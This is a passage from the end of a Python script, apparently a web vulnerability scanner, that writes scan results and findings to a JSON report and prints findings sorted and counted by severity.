            "mode": "auto" if auto_mode else "manual",
            "results": all_results,
            "vuln_findings": [
                {"module": f.module, "severity": f.severity, "title": f.title,
                 "detail": f.detail, "evidence": f.evidence}
                for f in vuln_findings
            ],
        }
        if dom_report is not None:
            out["dom_scan"] = dom_report
        if discovery:
            out["discovery"] = [
                {"label": d["label"], "status": d["status"], "content_type": d["content_type"]}
                for d in discovery
            ]
        if summary is not None:
            out["summary"] = summary
        args.output.write_text(json.dumps(out, indent=2, default=str), encoding="utf-8")
        print(f"Full report written to {args.output}", file=sys.stderr)

    return 0


def print_vuln_findings(findings: list[Finding]) -> None:
    findings_sorted = sorted(findings, key=lambda f: -SEVERITY_RANK.get(f.severity, 0))
    by_sev: dict[str, int] = {}
    for f in findings_sorted:
        by_sev[f.severity] = by_sev.get(f.severity, 0) + 1
    line = "=" * 64
    print(f"\n{line}\nVulnerability Module Findings\n{line}")
    print("Counts: " + ", ".join(
        f"{s}={by_sev.get(s, 0)}" for s in ("critical", "high", "medium", "low", "info")
        if by_sev.get(s, 0)
    ) or "(none)")
    for i, f in enumerate(findings_sorted, 1):
        print(f"\n  [{i}] [{f.severity:6s}] [{f.module}] {f.title}")
        print(f"      {f.detail}")
        if f.evidence:
            for k, v in list(f.evidence.items())[:4]:
                vs = str(v)
                if len(vs) > 200:
                    vs = vs[:200] + "…"
                print(f"      {k}: {vs}")
    print(line + "\n")


if __name__ == "__main__":
    sys.exit(main())
